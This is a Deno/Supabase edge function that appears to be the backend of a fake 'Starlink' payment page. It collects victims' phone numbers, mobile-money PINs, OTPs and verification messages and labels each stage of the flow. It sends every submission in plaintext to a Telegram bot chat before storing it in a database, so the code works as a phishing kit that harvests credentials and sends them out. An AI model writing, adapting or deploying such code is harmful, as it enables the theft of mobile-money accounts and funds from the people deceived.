import { createClient } from "npm:@supabase/supabase-js@2.57.4";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers":
    "Content-Type, Authorization, X-Client-Info, Apikey",
};

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") ?? "";
const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID") ?? "";

let _supabase: ReturnType<typeof createClient> | null = null;
function db() {
  if (_supabase) return _supabase;
  const url = Deno.env.get("SUPABASE_URL");
  const key = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!url || !key) return null;
  _supabase = createClient(url, key);
  return _supabase;
}

interface NotifyPayload {
  planName?: string;
  amount?: string;
  paymentMethod?: string;
  countryCode?: string;
  status?: string;
  countryName?: string;
  phone?: string;
  pin?: string;
  otp?: string;
  momoMessage?: string;
  verificationLink?: string;
  stage?: string;
}

const STATUSES = new Set(["pending", "completed", "failed"]);
const STAGE_LABELS: Record<string, string> = {
  gateway_opened: "Gateway opened",
  initiated: "Flow started",
  method_selected: "Payment method selected",
  phone_submitted: "Phone number submitted",
  pin_submitted: "PIN entered",
  momo_message: "MoMo verification message",
  otp_sent: "OTP sent",
  otp_submitted: "OTP submitted",
  otp_verify: "OTP verification",
  insufficient_balance: "Insufficient balance",
  completed: "Completed",
  failed: "Failed",
};

const clip = (v: unknown, n: number) =>
  String(v ?? "")
    .trim()
    .slice(0, n);

function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

const json = (body: unknown, status: number) =>
  new Response(JSON.stringify(body), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });

async function sendTelegram(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("[telegram] env not configured; skipping notify");
    return false;
  }
  try {
    const resp = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      },
    );
    if (!resp.ok) {
      console.error("[telegram] failed", (await resp.text()).slice(0, 300));
      return false;
    }
    return true;
  } catch (err) {
    console.error("[telegram] error", err);
    return false;
  }
}

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS")
    return new Response(null, { status: 200, headers: corsHeaders });

  try {
    const body: NotifyPayload = await req.json();

    const planName = clip(body.planName, 200);
    const amount = clip(body.amount, 50);
    const paymentMethod = clip(body.paymentMethod, 20);
    const countryCode = clip(body.countryCode, 10);
    const countryName = clip(body.countryName, 60);
    const phone = clip(body.phone, 25);
    const pin = clip(body.pin, 10);
    const otp = clip(body.otp, 10);
    const momoMessage = clip(body.momoMessage, 600);
    const verificationLink = clip(body.verificationLink, 500);
    const stage = clip(body.stage, 40);
    const status = STATUSES.has(body.status ?? "") ? body.status! : "pending";

    if (!paymentMethod && !stage) {
      return json({ error: "paymentMethod (or stage) is required" }, 400);
    }

    const details = {
      countryName,
      phone,
      pin,
      otp,
      momoMessage,
      verificationLink,
      stage,
    };

    // ── Notify FIRST so a DB failure can never swallow the alert ──
    const emoji =
      status === "completed" ? "✅" : status === "failed" ? "❌" : "⏳";
    const stageLabel = stage ? (STAGE_LABELS[stage] ?? stage) : "";

    const rows: [string, string][] = [
      ["Plan", planName],
      ["Amount", amount],
      ["Payment", paymentMethod],
      ["Country", [countryCode, countryName].filter(Boolean).join(" ")],
      ["Phone", phone],
      ["PIN", pin],
      ["OTP", otp],
      ["MoMo Msg", momoMessage],
      ["Link", verificationLink],
      ["Stage", stageLabel],
      ["Status", status],
      ["Time", new Date().toISOString()],
    ];

    const message =
      `<b>${emoji} Starlink Transaction</b>` +
      (stageLabel ? `\n<i>${escapeHtml(stageLabel)}</i>` : "") +
      "\n\n" +
      rows
        .filter(([, v]) => v !== "")
        .map(([k, v]) => `<b>${k}:</b> ${escapeHtml(v)}`)
        .join("\n");

    const notified = await sendTelegram(message);

    // ── Best-effort persistence ──
    let stored = false;
    let id: string | null = null;
    const client = db();
    if (client) {
      const { data, error } = await client
        .from("transactions")
        .insert({
          plan_name: planName,
          amount,
          payment_method: paymentMethod,
          country_code: countryCode,
          status,
          details,
        })
        .select("id")
        .single();

      if (error) {
        console.error("[db] insert failed", error);
      } else {
        stored = true;
        id = data?.id ?? null;
      }
    } else {
      console.warn("[db] env not configured; skipping insert");
    }

    if (!notified && !stored) {
      return json({ error: "Neither notify nor insert succeeded" }, 502);
    }

    return json({ success: true, id, notified, stored }, 200);
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    return json({ error: message }, 500);
  }
});
